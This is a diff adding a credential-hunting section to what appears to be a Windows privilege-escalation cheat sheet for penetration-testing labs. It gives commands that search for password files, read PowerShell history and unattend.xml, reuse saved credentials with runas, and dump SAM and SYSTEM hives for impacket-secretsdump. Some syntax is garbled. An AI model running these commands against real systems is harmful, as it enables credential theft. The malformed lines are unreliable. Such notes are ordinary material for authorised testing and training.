@@ -542,6 +542,78 @@ accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "Authenticated Users" c:\*.*
 ```
 
+
+# Sensitive Credentials
+
+## Password Hunting for Files
+
+### Common Locations to Search
+- `C:\Users\<username>`
+- `C:\Users`
+- `C:\Program Files` or `C:\inetpub` or `C:\temp`
+
+### Find Files by Name
+```cmd
+ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == &.config* == *user*
+```
+
+### Find Files by Content
+```cmd
+ findstr /SI "passw pwd" *.xml *.ini *.txt *.psl *.bat *.config
+```
+
+---
+
+## Tools (LaZagne)
+
+### Unattended Windows Installation
+```cmd
+dir /s /b | findstr /i "unattend.xml"  (in C drive)
+```
+
+### PowerShell History (For Windows 11)
+```cmd
+type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+---
+
+## Save Windows Credentials
+```cmd
+cmdkey /list
+```
+
+```cmd
+runas /savecred /user:mike.katz cmd.exe
+whoami /priv
+```
+
+---
+
+## IIS Configuration
+(Check manually)
+
+---
+
+## Retrieve Credentials from Software: Putty
+
+---
+
+## SAM File Extraction
+### Find SAM Backup or Use the Following Commands:
+```cmd
+C:\Windows\System32\config> reg save hklm\sam D:\HTB\sam_backup.hiv
+The operation completed successfully.
+
+C:\Windows\System32\config> reg save hklm\system D:\HTB\system_backup.hiv
+The operation completed successfully.
+```
+
+### Copy These Files to Kali Linux and Extract Credentials:
+```bash
+impacket-secretsdump -sam sam_backup.hiv -system system_backup.hiv LOCAL
+
+```
 ### LINK 
 https://www.fuzzysecurity.com/tutorials/16.html
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
